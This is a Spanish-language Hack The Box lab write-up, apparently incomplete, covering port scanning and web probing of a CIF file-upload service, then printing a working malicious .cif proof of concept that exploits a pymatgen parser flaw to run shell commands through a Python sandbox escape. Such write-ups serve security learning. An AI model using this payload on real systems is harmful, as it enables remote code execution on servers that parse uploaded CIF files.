## Conexión a la VPN

Primero, nos conectamos a la VPN de Hack The Box (HTB) utilizando las credenciales proporcionadas.

### Verificando Conectividad

Para comprobar que tenemos conectividad con la máquina objetivo, realizamos un `ping` y observamos que el TTL es 63. Esto generalmente indica que la máquina está ejecutando un sistema operativo basado en Linux en entornos controlados como HTB.

```bash
ping <IP_de_la_máquina>
```

## Escaneo de Puertos

Realizamos un escaneo completo de puertos para identificar los servicios abiertos en la máquina:

```bash
sudo nmap -p- -sCV --open --min-rate=500 -n -vvv -Pn <IP_de_la_máquina> -oG escaneo
```

Luego le realizamos un caneo a los puertos 22 y 5000

```zsh
sudo nmap -sCV -p22,5000 ip-target -oN allports
``` 

Podemos hacer supocisiones por ejemplo empezar a enviar un 

```
curl ip-target:5000
```

Como vemos que esta en html, podemos ver las partes más importantes con `html2text`

```
curl ip-target:5000 | html2text
```

Y podemos observar que indica que podemos subir archivos CIF 

 Ahora veremos las tecnologias por detras con whatweb 

```
whatweb https://ip-target:5000
```

Revisamos la version del ssh y es superior a la 7.7 y del sistema es `OpenSSH 8.2p1 Ubuntu`

Ahora le echamos un ojo a la página web por el puerto 5000


Vamos a probar creando y subieno un archivo `.txt` para validar extenciones, creando un simple archivo y luego subirlo en la página para ver el tipo de error que nos da 

Luego intentamos crear un archivo simple con un hola del archivo `test.cif`
No se logra nada xd

Lo primero que haría es buscar un archivo malicioso `.cif` 

Y encontramos este repo en git : 
- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Y este es el código con el que tuvimos Control  remoto al servidor :

Poc vuln.cif

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Editamos la parte del touch pwned y nos ponemos a la escucha por **tcpdump**:

```
tcpdump -i tun0 icmp -n
```

min 20:35 (no se vio nada en el tcpdump tratar de cambiar eth0)